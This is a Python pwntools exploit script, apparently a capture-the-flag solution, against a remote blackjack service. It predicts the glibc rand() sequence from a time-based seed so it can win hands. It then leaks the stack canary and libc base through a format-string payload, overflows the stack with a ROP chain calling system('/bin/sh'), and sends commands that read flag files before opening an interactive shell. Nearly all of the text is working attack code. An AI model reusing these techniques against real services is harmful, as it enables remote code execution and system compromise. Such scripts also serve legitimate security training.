#!/usr/bin/env python3
from pwn import *
import os
import re
import time

root = os.path.dirname(os.path.abspath(__file__))
LIBC = os.path.join(root, 'libc.so.6')

context.arch = 'amd64'
context.log_level = 'debug'

libc = ELF(LIBC, checksec=False)

libc_ret = libc.sym['__libc_start_main'] + 0x8b

cards = [b'A', b'2', b'3', b'4', b'5', b'6', b'7',b'8', b'9', b'10', b'J', b'Q', b'K']


def start():
    host = 'instancer.dalctf2026.com'
    port = 38438

    return remote(host, port)


def pcard_name(c):
    return cards[c - 1]


def card_value(c):
    if c == 1:
        return 11
    if c >= 11:
        return 10
    return c


def hand_total(cards):
    total = sum(card_value(c) for c in cards)
    aces = cards.count(1)

    while total > 21 and aces:
        total -= 10
        aces -= 1

    return total


def glibc_rand_sequence(seed, n):
    r = [0] * (344 + n)

    r[0] = seed & 0xffffffff

    for i in range(1, 31):
        r[i] = (16807 * r[i - 1]) % 2147483647

    for i in range(31, 34):
        r[i] = r[i - 31]

    for i in range(34, 344 + n):
        r[i] = (r[i - 31] + r[i - 3]) & 0xffffffff

    return [r[i] >> 1 for i in range(344, 344 + n)]


def card_sequence(seed, n=10000):
    return [(x % 13) + 1 for x in glibc_rand_sequence(seed, n)]


def simulate_hand(seq, idx, hits):
    player = [seq[idx], seq[idx + 2]]
    dealer = [seq[idx + 1], seq[idx + 3]]

    j = idx + 4
    actual_hits = 0

    for _ in range(hits):
        if hand_total(player) >= 21:
            break

        player.append(seq[j])
        j += 1
        actual_hits += 1

        if hand_total(player) >= 21:
            break

    ptotal = hand_total(player)

    if ptotal > 21:
        return False, j, actual_hits

    while hand_total(dealer) < 17:
        dealer.append(seq[j])
        j += 1

    dtotal = hand_total(dealer)

    return dtotal > 21 or ptotal > dtotal, j, actual_hits


def choose_winning_action(seq, idx):
    for desired_hits in range(10):
        won, new_idx, actual_hits = simulate_hand(seq, idx, desired_hits)

        if won:
            return actual_hits, new_idx

    # if can't win then lose lol
    _, new_idx, actual_hits = simulate_hand(seq, idx, 0)

    return actual_hits, new_idx


def sync_seed(io):
    data = io.recvuntil(b'Your hand')
    data += io.recvline()

    dealer = re.search(rb'Dealer shows: ([A-Z0-9]+) \[\?\]', data).group(1)

    m = re.search(rb'Your hand\s*: ([A-Z0-9]+) ([A-Z0-9]+)', data)
    player1, player2 = m.group(1), m.group(2)

    visible = [player1, dealer, player2]

    now = int(time.time())
    window = int(args.WINDOW or 300)

    for seed in range(now - window, now + window + 1):
        seq = card_sequence(seed)

        if [pcard_name(seq[0]), pcard_name(seq[1]), pcard_name(seq[2])] == visible:
            log.info(f'seed = {seed}')
            return seed, seq, 0


def play_until_name_prompt(io, seq, idx):
    hits, new_idx = choose_winning_action(seq, idx)
    sent_hits = 0

    while True:
        which = io.recvregex(
            rb'\(h\)it or \(s\)tand\? |'
            rb'Enter your name for the transaction record: |'
            rb'Play another hand\? \[y/n\]: ',
            capture=False,
        )

        if which.endswith(b'(h)it or (s)tand? '):
            if sent_hits < hits:
                io.sendline(b'h')
                sent_hits += 1
            else:
                io.sendline(b's')

        elif which.endswith(b'Enter your name for the transaction record: '):
            return True, new_idx

        else:
            io.sendline(b'y')
            return False, new_idx


def leak_canary_and_libc(io, seq, idx):
    while True:
        won, idx = play_until_name_prompt(io, seq, idx)

        if won:
            break

    io.sendline(f'%41$p.%43$p'.encode())

    io.recvuntil(b'Processing transaction for: ')
    leak = io.recvuntil(b'Play another hand? [y/n]: ', drop=True)

    m = re.search(rb'(0x[0-9a-f]+)\.(0x[0-9a-f]+)', leak)

    canary = int(m.group(1), 16)
    libc_leak = int(m.group(2), 16)

    libc.address = libc_leak - libc_ret

    log.success(f'canary = {canary:#x}')
    log.success(f'libc leak = {libc_leak:#x}')
    log.success(f'libc base = {libc.address:#x}')

    io.sendline(b'y')

    return canary, idx


def main():
    io = start()

    _, seq, idx = sync_seed(io)

    canary, idx = leak_canary_and_libc(io, seq, idx)

    while True:
        won, idx = play_until_name_prompt(io, seq, idx)

        if won:
            break

    rop = ROP(libc)

    ret = rop.find_gadget(['ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    bin_sh = next(libc.search(b'/bin/sh\x00'))

    payload = flat(
        b'A' * 72,
        canary,
        b'A' * 8,
        ret,                  # stack alignment for glibc system()
        pop_rdi,
        bin_sh,
        libc.sym['system'],
        libc.sym['exit'],
    )

    io.sendline(payload)

    io.recvuntil(b'Play another hand? [y/n]: ')
    io.sendline(b'n')

    io.sendline(
        b'cat flag* 2>/dev/null || '
        b'cat /home/*/flag* 2>/dev/null || '
        b'/bin/sh'
    )

    io.interactive()


if __name__ == '__main__':
    main()